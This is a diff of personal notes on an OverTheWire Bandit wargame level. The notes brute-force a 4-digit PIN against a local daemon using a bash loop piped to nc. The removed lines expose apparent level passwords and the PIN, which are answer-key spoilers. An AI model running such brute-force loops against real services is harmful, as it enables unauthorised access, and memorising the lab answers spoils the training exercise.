@@ -1,13 +1,22 @@
 ssh bandit24@bandit.labs.overthewire.org -p2220
 
-A daemon is listening on port 30002 and will give you the password for bandit25
-if given the password for bandit24 and a secret numeric 4-digit pincode. There
-is no way to retrieve the pincode except by going through all of the 10000
-combinations, called brute-forcing.
+A daemon is listening on port 30002 and will give you the password for bandit25 
+if given the password for bandit24 and a secret numeric 4-digit pincode. 
+There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
 
-for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002; done
+for i in {0000..9999}; do echo <snip> $i | nc localhost 30002; done
 
-PIN: 5440
+this method is way to slow. trying a script:
 
-uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+for i in {0000..9999}; do echo <snip> $i >> in; done
+
+in the end I had to split this into two 500 line files as it appeared to die after a while. Im not sure what sort of throttling is in place on the server.
+But in my case I found the pin in the 500+ file:
+
+cat in | nc localhost 30002 >> out
+
+Correct!
+The password of user bandit25 is <snip>
+
 
